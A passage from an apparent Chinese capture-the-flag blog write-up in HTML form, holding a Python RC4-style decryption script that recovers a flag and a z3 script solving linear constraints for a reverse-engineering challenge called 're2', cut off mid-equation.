class="number">0x86</span>, <span class="number">0x6E</span>, <span class="number">0xCD</span>, <span class="number">0x78</span>, <span class="number">0x07</span>, <span class="number">0x57</span>, <span class="number">0x35</span>, <span class="number">0x41</span>,</span><br><span class="line">       <span class="number">0x5E</span>, <span class="number">0xFB</span>, <span class="number">0x8E</span>, <span class="number">0x7D</span>, <span class="number">0xB4</span>, <span class="number">0x70</span>, <span class="number">0x33</span>, <span class="number">0x88</span>, <span class="number">0xAD</span>, <span class="number">0xBE</span>, <span class="number">0xA0</span>, <span class="number">0xB9</span>, <span class="number">0x93</span>, <span class="number">0x2D</span>, <span class="number">0xCC</span>, <span class="number">0x1F</span>, <span class="number">0x39</span>, <span class="number">0x4F</span>, <span class="number">0xF8</span>,</span><br><span class="line">       <span class="number">0x7B</span>, <span class="number">0x1C</span>, <span class="number">0xC5</span>, <span class="number">0xA6</span>, <span class="number">0x67</span>, <span class="number">0x76</span>, <span class="number">0xAA</span>, <span class="number">0x27</span>, <span class="number">0x3E</span>, <span class="number">0xAB</span>, <span class="number">0x3B</span>, <span class="number">0x3C</span>, <span class="number">0x6B</span>, <span class="number">0xE8</span>, <span class="number">0xAE</span>, <span class="number">0xFE</span>, <span class="number">0xC6</span>, <span class="number">0x64</span>, <span class="number">0x61</span>,</span><br><span class="line">       <span class="number">0x05</span>, <span class="number">0xD0</span>, <span class="number">0x4E</span>, <span class="number">0x54</span>, <span class="number">0xD4</span>, <span class="number">0x8B</span>, <span class="number">0x0B</span>, <span class="number">0xBF</span>, <span class="number">0xAF</span>, <span class="number">0x80</span>, <span class="number">0x9F</span>, <span class="number">0x03</span>, <span class="number">0xF1</span>, <span class="number">0x1E</span>, <span class="number">0xDA</span>, <span class="number">0x46</span>, <span class="number">0xA3</span>, <span class="number">0x16</span>, <span class="number">0xBA</span>,</span><br><span class="line">       <span class="number">0xA9</span>, <span class="number">0xB0</span>, <span class="number">0xE9</span>, <span class="number">0x9A</span>, <span class="number">0x0E</span>, <span class="number">0x12</span>, <span class="number">0x71</span>, <span class="number">0xC8</span>, <span class="number">0x2E</span>, <span class="number">0x49</span>, <span class="number">0x60</span>, <span class="number">0x20</span>, <span class="number">0x4C</span>, <span class="number">0x0A</span>, <span class="number">0x2A</span>, <span class="number">0x18</span>, <span class="number">0x2C</span>, <span class="number">0x83</span>, <span class="number">0xBB</span>,</span><br><span class="line">       <span class="number">0x95</span>, <span class="number">0x17</span>, <span class="number">0xDE</span>, <span class="number">0xEF</span>, <span class="number">0xE0</span>, <span class="number">0xDD</span>, <span class="number">0x21</span>, <span class="number">0x4B</span>, <span class="number">0x48</span>, <span class="number">0xD2</span>, <span class="number">0x51</span>, <span class="number">0x04</span>, <span class="number">0x90</span>, <span class="number">0x91</span>, <span class="number">0x82</span>, <span class="number">0x6D</span>, <span class="number">0x3D</span>, <span class="number">0xD6</span>, <span class="number">0xFC</span>,</span><br><span class="line">       <span class="number">0xFD</span>, <span class="number">0xC2</span>, <span class="number">0x56</span>, <span class="number">0x25</span>, <span class="number">0x14</span>, <span class="number">0x23</span>, <span class="number">0x42</span>, <span class="number">0xF4</span>, <span class="number">0xDB</span>, <span class="number">0xD3</span>, <span class="number">0x75</span>, <span class="number">0x32</span>, <span class="number">0x1A</span>, <span class="number">0x24</span>, <span class="number">0x34</span>, <span class="number">0x0D</span>, <span class="number">0x5C</span>, <span class="number">0xA5</span>, <span class="number">0xE7</span>,</span><br><span class="line">       <span class="number">0x36</span>, <span class="number">0xF9</span>, <span class="number">0x19</span>, <span class="number">0x38</span>, <span class="number">0xC4</span>, <span class="number">0xBC</span>, <span class="number">0x96</span>, <span class="number">0xB3</span>, <span class="number">0x06</span>, <span class="number">0xA7</span>, <span class="number">0xC9</span>, <span class="number">0xF3</span>, <span class="number">0x7A</span>, <span class="number">0xF2</span>, <span class="number">0xDF</span>, <span class="number">0xE6</span>, <span class="number">0x69</span>, <span class="number">0x81</span>, <span class="number">0xEB</span>,</span><br><span class="line">       <span class="number">0x9C</span>, <span class="number">0x40</span>, <span class="number">0x85</span>, <span class="number">0x26</span>, <span class="number">0x97</span>, <span class="number">0xB1</span>, <span class="number">0x11</span>, <span class="number">0xD7</span>, <span class="number">0x5B</span>, <span class="number">0x94</span>, <span class="number">0x73</span>, <span class="number">0x84</span>, <span class="number">0x74</span>, <span class="number">0x89</span>, <span class="number">0xEC</span>, <span class="number">0x0F</span>, <span class="number">0x7E</span>, <span class="number">0x22</span>, <span class="number">0x6C</span>,</span><br><span class="line">       <span class="number">0x3F</span>, <span class="number">0x87</span>, <span class="number">0xAC</span>, <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x1B</span>, <span class="number">0xE2</span>, <span class="number">0x13</span>, <span class="number">0x9B</span>, <span class="number">0x8C</span>, <span class="number">0xA2</span>, <span class="number">0xD5</span>, <span class="number">0x2F</span>, <span class="number">0x4D</span>, <span class="number">0x00</span>, <span class="number">0x98</span>, <span class="number">0xB5</span>, <span class="number">0x7F</span>, <span class="number">0x47</span>,</span><br><span class="line">       <span class="number">0xD8</span>, <span class="number">0x28</span>, <span class="number">0x8D</span>, <span class="number">0x2B</span>, <span class="number">0xEE</span>, <span class="number">0x08</span>, <span class="number">0xF7</span>, <span class="number">0x3A</span>, <span class="number">0x53</span>, <span class="number">0x7C</span>, <span class="number">0xE5</span>, <span class="number">0xF0</span>, <span class="number">0xC7</span>, <span class="number">0xBD</span>, <span class="number">0x09</span>, <span class="number">0x77</span>, <span class="number">0x4A</span>, <span class="number">0xB7</span>, <span class="number">0x30</span>,</span><br><span class="line">       <span class="number">0xED</span>, <span class="number">0x5A</span>, <span class="number">0xDC</span>, <span class="number">0xC3</span>, <span class="number">0xB6</span>, <span class="number">0xA4</span>, <span class="number">0x29</span>, <span class="number">0xE4</span>]</span><br><span class="line"></span><br><span class="line">v6 = <span class="number">0</span></span><br><span class="line">v7 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(bi)):</span><br><span class="line">    v6 += <span class="number">1</span></span><br><span class="line">    v7 += key[v6]</span><br><span class="line">    v7 &amp;= <span class="number">0xff</span></span><br><span class="line">    temp = key[v6]</span><br><span class="line">    key[v6] = key[v7]</span><br><span class="line">    key[v7] = temp</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\b"</span> + chr(key[(key[v6] + key[v7]) &amp; <span class="number">0xff</span>] ^ bi[i]),</span><br><span class="line"></span><br><span class="line"><span class="comment"># s1mple_trick_233</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h4><p>打开<strong>z3</strong>解。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a0 = Int(<span class="string">'a0'</span>)</span><br><span class="line">a1 = Int(<span class="string">'a1'</span>)</span><br><span class="line">a2 = Int(<span class="string">'a2'</span>)</span><br><span class="line">a3 = Int(<span class="string">'a3'</span>)</span><br><span class="line">a4 = Int(<span class="string">'a4'</span>)</span><br><span class="line">a5 = Int(<span class="string">'a5'</span>)</span><br><span class="line">a6 = Int(<span class="string">'a6'</span>)</span><br><span class="line">a7 = Int(<span class="string">'a7'</span>)</span><br><span class="line">a8 = Int(<span class="string">'a8'</span>)</span><br><span class="line">a9 = Int(<span class="string">'a9'</span>)</span><br><span class="line">a10 = Int(<span class="string">'a10'</span>)</span><br><span class="line">a11 = Int(<span class="string">'a11'</span>)</span><br><span class="line">a12 = Int(<span class="string">'a12'</span>)</span><br><span class="line">a13 = Int(<span class="string">'a13'</span>)</span><br><span class="line">a14 = Int(<span class="string">'a14'</span>)</span><br><span class="line">a15 = Int(<span class="string">'a15'</span>)</span><br><span class="line">a16 = Int(<span class="string">'a16'</span>)</span><br><span class="line">a17 = Int(<span class="string">'a17'</span>)</span><br><span class="line">a18 = Int(<span class="string">'a18'</span>)</span><br><span class="line">a19 = Int(<span class="string">'a19'</span>)</span><br><span class="line">a20 = Int(<span class="string">'a20'</span>)</span><br><span class="line">a21 = Int(<span class="string">'a21'</span>)</span><br><span class="line">a22 = Int(<span class="string">'a22'</span>)</span><br><span class="line">a23 = Int(<span class="string">'a23'</span>)</span><br><span class="line">a24 = Int(<span class="string">'a24'</span>)</span><br><span class="line">a25 = Int(<span class="string">'a25'</span>)</span><br><span class="line">a26 = Int(<span class="string">'a26'</span>)</span><br><span class="line">a27 = Int(<span class="string">'a27'</span>)</span><br><span class="line">a28 = Int(<span class="string">'a28'</span>)</span><br><span class="line">a29 = Int(<span class="string">'a29'</span>)</span><br><span class="line">a30 = Int(<span class="string">'a30'</span>)</span><br><span class="line">a31 = Int(<span class="string">'a31'</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">37027</span> * a30 + <span class="number">50244</span> * a28 + <span class="number">37157</span> * a27 + <span class="number">58180</span> * a24 + <span class="number">1513</span> * a23 + <span class="number">39390</span> * a22 + <span class="number">29470</span> * a19 + <span class="number">44970</span> * a18 + <span class="number">48734</span> * a16 + <span class="number">2139</span> * a15 + <span class="number">45204</span> * a11 + <span class="number">35081</span> * a10 + <span class="number">39591</span> * a9 + <span class="number">47551</span> * a7 + <span class="number">20069</span> * a6 + <span class="number">45266</span> * a5 + <span class="number">22432</span> * a4 + <span class="number">44493</span> * a0 - <span class="number">326</span> * a1 - <span class="number">57451</span> * a2 - <span class="number">18424</span> * a3 - <span class="number">3751</span> * a8 - <span class="number">6984</span> * a12 - <span class="number">9410</span> * a13 - <span class="number">54261</span> * a14 - <span class="number">62111</span> * a17 - <span class="number">20305</span> * a20 - <span class="number">33120</span> * a21 - <span class="number">11160</span> * a25 - <span class="number">24198</span> * a26 - <span class="number">1646</span> * a29 - <span class="number">13318</span> * a31 == <span class="number">34771791</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">12535</span> * a30 + <span class="number">50109</span> * a25 + <span class="number">48594</span> * a22 + <span class="number">11260</span> * a21 + <span class="number">51548</span> * a20 + <span class="number">26720</span> * a18 + <span class="number">9187</span> * a16 + <span class="number">28702</span> * a14 + <span class="number">9624</span> * a13 + <span class="number">21730</span> * a11 + <span class="number">46114</span> * a9 + <span class="number">32499</span> * a8 + <span class="number">11900</span> * a5 + <span class="number">22008</span> * a4 + <span class="number">48560</span> * a2 + <span class="number">-54741</span> * a0 - <span class="number">3606</span> * a1 - <span class="number">45416</span> * a3 - <span class="number">24275</span> * a6 - <span class="number">64371</span> * a7 - <span class="number">25714</span> * a10 - <span class="number">56673</span> * a12 - <span class="number">39430</span> * a15 - <span class="number">35779</span> * a17 - <span class="number">15144</span> * a19 - <span class="number">45050</span> * a23 - <span class="number">59016</span> * a24 - <span class="number">29262</span> * a26 - <span class="number">55650</span> * a27 - <span class="number">29492</span> * a28 - <span class="number">13828</span> * a29 + <span class="number">40522</span> * a31 == <span class="number">-9451883</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">12097</span> * a30 + <span class="number">57988</span> * a28 + <span class="number">52683</span> * a27 + <span class="number">31675</span> * a26 + <span class="number">57822</span> * a25 + <span class="number">29817</span> * a22 + <span class="number">53780</span> * a21 + <span class="number">3541</span> * a20 + <span class="number">20331</span> * a19 + <span class="number">32755</span> * a16 + <span class="number">43681</span> * a15 + <span class="number">20144</span> * a14 + <span class="number">2665</span> * a11 + <span class="number">64858</span> * a10 + <span class="number">63538</span> * a9 + <span class="number">19362</span> * a7 + <span class="number">5819</span> * a5 + <span class="number">15266</span> * a4 + <span class="number">54532</span> * a3 + <span class="number">17703</span> * a0 - <span class="number">16114</span> * a1 - <span class="number">24359</span> * a2 - <span class="number">33999</span> * a6 - <span class="number">58904</span> * a8 - <span class="number">11844</span> * a12 - <span class="number">29623</span> * a13 - <span class="number">42532</span> * a17 - <span class="number">60912</span> * a18 - <span class="number">4711</span> * a23 - <span class="number">56853</span> * a24 - <span class="number">33486</span> * a29 + <span class="number">24590</span> * a31 == <span class="number">29782736</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">51792</span> * a30 + <span class="number">36741</span> * a29 + <span class="number">32393</span> * a28 + <span class="number">59561</span> * a27 + <span class="number">48151</span> * a18 + <span class="number">37522</span> * a17 + <span class="number">28232</span> * a15 + <span class="number">2783</span> * a12 + <span class="number">28</span> * a11 + <span class="number">27013</span> * a10 + <span class="number">24960</span> * a9 + <span class="number">42702</span> * a7 + <span class="number">17219</span> * a5 + <span class="number">41149</span> * a4 + <span class="number">3430</span> * a3 + <span class="number">24247</span> * a0 + <span class="number">64898</span> * a1 - <span class="number">24733</span> * a2 - <span class="number">16545</span> * a6 - <span class="number">1315</span> * a8 - <span class="number">15867</span> * a13 - <span class="number">12126</span> * a14 - <span class="number">3823</span> * a16 - <span class="number">20727</span> * a19 - <span class="number">12037</span> * a20 - <span class="number">9347</span> * a21 - <span class="number">39338</span> * a22 - <span class="number">50524</span> * a23 - <span class="number">38675</span> * a24 - <span class="number">26114</span> * a25 - <span class="number">4975</span> * a26 - <span class="number">24297</span> * a31 == <span class="number">27959979</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">64702</span> * a30 + <span class="number">13289</span> * a29 + <span class="number">25143</span> * a28 + <span class="number">35562</span> * a26 + <span class="number">54655</span> * a25 + <span class="number">26782</span> * a21 + <span class="number">3079</span> * a19 + <span class="number">52035</span> * a18 + <span class="number">62825</span> * a17 + <span class="number">57738</span> * a16 + <span class="number">5380</span> * a15 + <span class="number">64221</span> * a12 + <span class="number">41251</span> * a8 + <span class="number">15294</span> * a2 + <span class="number">-32261</span> * a0 - <span class="number">54551</span> * a1 - <span class="number">61664</span> * a3 - <span class="number">40648</span> * a4 - <span class="number">12277</span> * a5 - <span class="number">55300</span> * a6 - <span class="number">63212</span> * a7 - <span class="number">45548</span> * a9 - <span class="number">22362</span> * a10 - <span class="number">32993</span> * a11 - <span class="number">43046</span> * a13 - <span class="number">40770</span> * a14 - <span class="number">7119</span> * a20 - <span class="number">36194</span> * a22 - <span class="number">56102</span> * a23 - <span class="number">19468</span> * a24 - <span class="number">59856</span> * a27 + <span class="number">23822</span> * a31 == <span class="number">-10644544</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">5977</span> * a30 + <span class="number">63681</span> * a24 + <span class="number">6461</span> * a23 + <span class="number">43924</span> * a19 + <span class="number">9886</span> * a18 + <span class="number">22558</span> * a17 + <span class="number">8314</span> * a16 + <span class="number">47577</span> * a14 + <span class="number">43847</span> * a13 + <span class="number">32583</span> * a10 + <span class="number">30627</span> * a8 + <span class="number">47843</span> * a7 + <span class="number">33702</span> * a3 + <span class="number">60965</span> * a2 + <span class="number">-9407</span> * a0 + <span class="number">64048</span> * a1 - <span class="number">12654</span> * a4 - <span class="number">56126</span> * a5 - <span class="number">47366</span> * a6 - <span class="number">29056</span> * a9 - <span class="number">50822</span> * a11 - <span class="number">6240</span> * a12 - <span class="number">12371</span> * a15 - <span class="number">23282</span> * a20 - <span class="number">13137</span> * a21 - <span class="number">13716</span> * a22 - <span class="number">43391</span> * a25 - <span class="number">37217</span> * a26 - <span class="number">43714</span> * a27 - <span class="number">55909</span> * a28 - <span class="number">62806</span> * a29 + <span class="number">36688</span> * a31 == <span class="number">230179</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">26401</span> * a30 + <span class="number">49426</span> * a29 + <span class="number">13407</span> * a28 + <span class="number">58093</span> * a27 + <span class="number">44955</span> * a26 + <span class="number">36904</span> * a25 + <span class="number">5856</span> * a23 + <span class="number">47030</span> * a22 + <span class="number">23917</span> * a20 + <span class="number">40389</span> * a18 + <span class="number">46343</span> * a16 + <span class="number">63390</span> * a14 + <span class="number">54218</span> * a9 + <span class="number">16024</span> * a8 + <span class="number">44459</span> * a6 + <span class="number">57144</span> * a5 + <span class="number">2565</span> * a4 + <span class="number">20301</span> * a2 + <span class="number">-23136</span> * a0 + <span class="number">47281</span> * a1 - <span class="number">61441</span> * a3 - <span class="number">31365</span> * a7 - <span class="number">56894</span> * a10 - <span class="number">52977</span> * a11 - <span class="number">39404</span> * a12 - <span class="number">63477</span> * a13 - <span class="number">22773</span> * a15 - <span class="number">50258</span> * a17 - <span class="number">25970</span> * a19 - <span class="number">56685</span> * a21 - <span class="number">55893</span> * a24 - <span class="number">25199</span> * a31 == <span class="number">15871572</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">22198</span> * a27 + <span class="number">41681</span> * a26 + <span class="number">53436</span> * a25 + <span class="number">11269</span> * a24 + <span class="number">15201</span> * a23 + <span class="number">14952</span> * a21 + <span class="number">58351</span> * a20 + <span class="number">1742</span> * a18 + <span class="number">7881</span> * a16 + <span class="number">18373</span> * a15 + <span class="number">50053</span> * a13 + <span class="number">3911</span> * a11 + <span class="number">15341</span> * a10 + <span class="number">42663</span> * a6 + <span class="number">22400</span> * a4 + <span class="number">4696</span> * a3 + <span class="number">18654</span> * a2 + <span class="number">62577</span> * a0 + <span class="number">23069</span> * a1 - <span class="number">16178</span> * a5 - <span class="number">34941</span> * a7 - <span class="number">50803</span> * a8 - <span class="number">28229</span> * a9 - <span class="number">45565</span> * a12 - <span class="number">45774</span> * a14 - <span class="number">28140</span> * a17 - <span class="number">29986</span> * a19 - <span class="number">40067</span> * a22 - <span class="number">63863</span> * a28 - <span class="number">50393</span> * a29 - <span class="number">14615</span> * a30 + <span class="number">16722</span> * a31 == <span class="number">12844672</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">17326</span> * a30 + <span class="number">5750</span> * a27 + <span class="number">34037</span> * a25 + <span class="number">40581</span> * a24 + <span class="number">35119</span> * a22 + <span class="number">29560</span> * a21 + <span class="number">54431</span> * a17 + <span class="number">40135</span> * a14 + <span class="number">7362</span> * a11 + <span class="number">31888</span> * a10 + <span class="number">37963</span> * a3 + <span class="number">910</span> * a2 + <span class="number">-39728</span> * a0 + <span class="number">57392</span> * a1 - <span class="number">2274</span> * a4 - <span class="number">61995</span> * a5 - <span class="number">43938</span> * a6 - <span class="number">12412</span> * a7 - <span class="number">10642</span> * a8 - <span class="number">10303</span> * a9 - <span class="number">16356</span> * a12 - <span class="number">615</span> * a13 - <span class="number">11314</span> * a15 - <span class="number">17185</span> * a16 - <span class="number">61134</span> * a18 - <span class="number">4620</span> * a19 - <span class="number">4591</span> * a20 - <span class="number">51958</span> * a23 - <span class="number">65066</span> * a26 - <span class="number">6232</span> * a28 - <span class="number">60002</span> * a29 + <span class="number">30503</span> * a31 == <span class="number">-7906855</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">31106</span> * a29 + <span class="number">2313</span> * a25 + <span class="number">32582</span> * a24 + <span class="number">61335</span> * a19 + <span class="number">50686</span> * a16 + <span class="number">27537</span> * a15 + <span class="number">58190</span> * a13 + <span class="number">25366</span> * a12 + <span class="number">56260</span> * a11 + <span class="number">6483</span> * a10 + <span class="number">61315</span> * a6 + <span class="number">48180</span> * a2 + <span class="number">-16296</span> * a0 - <span class="number">8786</span> * a1 - <span class="number">65236</span> * a3 - <span class="number">48383</span> * a4 - <span class="number">32713</span> * a5 - <span class="number">58771</span> * a7 - <span class="number">47593</span> * a8 - <span class="number">14512</span> * a9 - <span class="number">60203</span> * a14 - <span class="number">7295</span> * a17 - <span class="number">3885</span> * a18 - <span class="number">39212</span> * a20 - <span class="number">40687</span> * a21 - <span class="number">19258</span> * a22 - <span class="number">57463</span> * a23 - <span class="number">24504</span> * a26 - <span class="number">11629</span> * a27 - <span class="number">8917</span> * a28 - <span class="number">4535</span> * a30 + <span class="number">38212</span> * a31 == <span class="number">-5359162</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">33683</span> * a28 + <span class="number">48721</span> * a27 + <span class="number">59096</span> * a26 + <span class="number">17103</span> * a25 + <span class="number">13203</span> * a24 + <span class="number">51928</span> * a23 + <span class="number">33264</span> * a22 + <span class="number">39538</span> * a20 + <span class="number">30153</span> * a18 + <span class="number">35247</span> * a16 + <span class="number">528</span> * a15 + <span class="number">6847</span> * a13 + <span class="number">18706</span> * a12 + <span class="number">35320</span> * a11 + <span class="number">3265</span> * a10 + <span class="number">11413</span> * a9 + <span class="number">51102</span> * a7 + <span class="number">39253</span> * a6 + <span class="number">63683</span> * a5 + <span class="number">25689</span> * a3 + <span class="number">-31610</span> * a0 + <span class="number">52623</span> * a1 - <span class="number">35005</span> * a2 - <span class="number">9320</span> * a4 - <span class="number">16508</span> * a8 - <span class="number">55110</span> * a14 - <span class="number">63180</span> * a17 - <span class="number">13666</span> * a19 - <span class="number">49046</span> * a21 - <span class="number">42949</span> * a29 - <span class="number">60950</span> * a30 + <span class="number">26096</span> * a31 == <span class="number">34815239</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">49588</span> * a30 + <span class="number">61328</span> * a28 + <span class="number">5176</span> * a23 + <span class="number">50390</span> * a22 + <span class="number">21307</span> * a21 + <span class="number">46709</span> * a20 + <span class="number">28722</span> * a19 + <span class="number">3656</span> * a17 + <span class="number">15786</span> * a16 + <span class="number">21116</span> * a15 + <span class="number">49637</span> * a14 + <span class="number">45466</span> * a12 + <span class="number">30791</span> * a10 + <span class="number">59808</span> * a9 + <span class="number">15859</span> * a8 + <span class="number">6146</span> * a7 + <span class="number">47557</span> * a0 + <span class="number">52902</span> * a1 - <span class="number">12806</span> * a2 - <span class="number">59773</span> * a3 - <span class="number">9182</span> * a4 - <span class="number">57417</span> * a5 - <span class="number">18447</span> * a6 - <span class="number">54963</span> * a11 - <span class="number">61599</span> * a13 - <span class="number">18454</span> * a18 - <span class="number">30277</span> * a24 - <span class="number">25544</span> * a25 - <span class="number">17882</span> * a26 - <span class="number">25149</span> * a27 - <span class="number">17363</span> * a29 + <span class="number">21848</span> * a31 == <span class="number">23582278</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">18191</span> * a30 + <span class="number">58284</span> * a27 + <span class="number">4680</span> * a25 + <span class="number">42417</span> * a24 + <span class="number">36604</span> * a20 + <span class="number">54770</span> * a19 + <span class="number">33925</span> * a15 + <span class="number">45365</span> * a13 + <span class="number">12457</span> * a12 + <span class="number">38339</span> * a11 + <span class="number">42505</span> * a9 + <span class="number">29438</span> * a8 + <span class="number">60503</span> * a7 + <span class="number">5104</span> * a4 + <span class="number">59129</span> * a3 + <span class="number">37688</span> * a0 + <span class="number">23309</span> * a1 - <span class="number">2616</span> * a2 - <span class="number">12561</span> * a5 - <span class="number">3215</span> * a6 - <span class="number">49703</span> * a10 - <span class="number">15471</span> * a14 - <span class="number">23447</span> * a16 - <span class="number">50859</span> * a17 - <span class="number">86</span> * a18 - <span class="number">3773</span> * a21 - <span class="number">9573</span> * a22 - <span class="number">25835</span> * a23 - <span class="number">20107</span> * a26 - <span class="number">45915</span> * a28 - <span class="number">56171</span> * a29 + <span class="number">29164</span> * a31 == <span class="number">30273764</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">64657</span> * a30 + <span class="number">49705</span> * a27 + <span class="number">5149</span> * a26 + <span class="number">16127</span> * a25 + <span class="number">29867</span> * a22 + <span class="number">50998</span> * a21 + <span class="number">13714</span> * a19 + <span class="number">18867</span> * a14 + <span class="number">19385</span> * a13 + <span class="number">38458</span> * a11 + <span class="number">12962</span> * a10 + <span class="number">24700</span> * a9 + <span class="number">50206</span> * a5 + <span class="number">56918</span> * a3 + <span class="number">20452</span> * a0 + <span class="number">18062</span> * a1 - <span class="number">56424</span> * a2 - <span class="number">10457</span> * a4 - <span class="number">12288</span> * a6 - <span class="number">54591</span> * a7 - <span class="number">44777</span> * a8 - <span class="number">52078</span> * a12 - <span class="number">9805</span> * a15 - <span class="number">48011</span> * a16 - <span class="number">27363</span> * a17 - <span class="number">20890</span> * a18 - <span class="number">788</span> * a20 - <span class="number">7954</span> * a23 - <span class="number">34056</span> * a24 - <span class="number">34732</span> * a28 - <span class="number">54092</span> * a29 + <span class="number">35416</span> * a31 == <span class="number">7501764</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">44968</span> * a30 + <span class="number">41644</span> * a26 + <span class="number">24333</span> * a25 + <span class="number">40656</span> * a23 + <span class="number">37330</span> * a22 + <span class="number">52431</span> * a20 + <span class="number">18903</span> * a19 + <span class="number">42329</span> * a16 + <span class="number">40645</span> * a13 + <span class="number">0x1FFF</span> * a8 + <span class="number">21330</span> * a5 + <span class="number">1951</span> * a2 + <span class="number">-39611</span> * a0 + <span class="number">25246</span> * a1 - <span class="number">37145</span> * a3 - <span class="number">3824</span> * a4 - <span class="number">49145</span> * a6 - <span class="number">43603</span> * a7 - <span class="number">60671</span> * a9 - <span class="number">53032</span> * a10 - <span class="number">48392</span> * a11 - <span class="number">15417</span> * a12 - <span class="number">13059</span> * a14 - <span class="number">58653</span> * a15 - <span class="number">51631</span> * a17 - <span class="number">50173</span> * a18 - <span class="number">44904</span> * a21 - <span class="number">34380</span> * a24 - <span class="number">18100</span> * a27 - <span class="number">57765</span> * a28 - <span class="number">64534</span> * a29 - <span class="number">26760</span> * a31 == <span class="number">-35816639</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">28579</span> * a30 + <span class="number">34688</span> * a29 + <span class="number">29438</span> * a27 + <span class="number">44211</span> * a24 + <span class="number">57593</span> * a21 + <span class="number">7046</span> * a19 + <span class="number">39526</span> * a18 + <span class="number">17545</span> * a17 + <span class="number">61374</span> * a16 + <span class="number">15405</span> * a15 + <span class="number">30392</span> * a14 + <span class="number">19579</span> * a12 + <span class="number">47959</span> * a11 + <span class="number">23926</span> * a9 + <span class="number">43929</span> * a5 + <span class="number">53538</span> * a3 + <span class="number">45166</span> * a2 + <span class="number">-39824</span> * a0 + <span class="number">44401</span> * a1 - <span class="number">2540</span> * a4 - <span class="number">54452</span> * a6 - <span class="number">11199</span> * a7 - <span class="number">19801</span> * a8 - <span class="number">13592</span> * a10 - <span class="number">29922</span> * a13 - <span class="number">34144</span> * a20 - <span class="number">5305</span> * a22 - <span class="number">46917</span> * a23 - <span class="number">4511</span> * a25 - <span class="number">23881</span> * a26 - <span class="number">39081</span> * a28 + <span class="number">3296</span> * a31 == <span class="number">30983928</span>)</span><br><span class="line">s.add(</span><br><span class="line">    <span class="number">40454</span> * a30 + <span class="number">64380</span> * a29 + <span class="number">41415</span> * a27 + <span class="number">8487</span> * a22 + <span class="number">49381</span> * a19 + <span class="number">7959</span> * a18 + <span class="number">36587</span> * a16 + <span class="number">24510</span> * a15 + <span class="number">6928</span> * a14 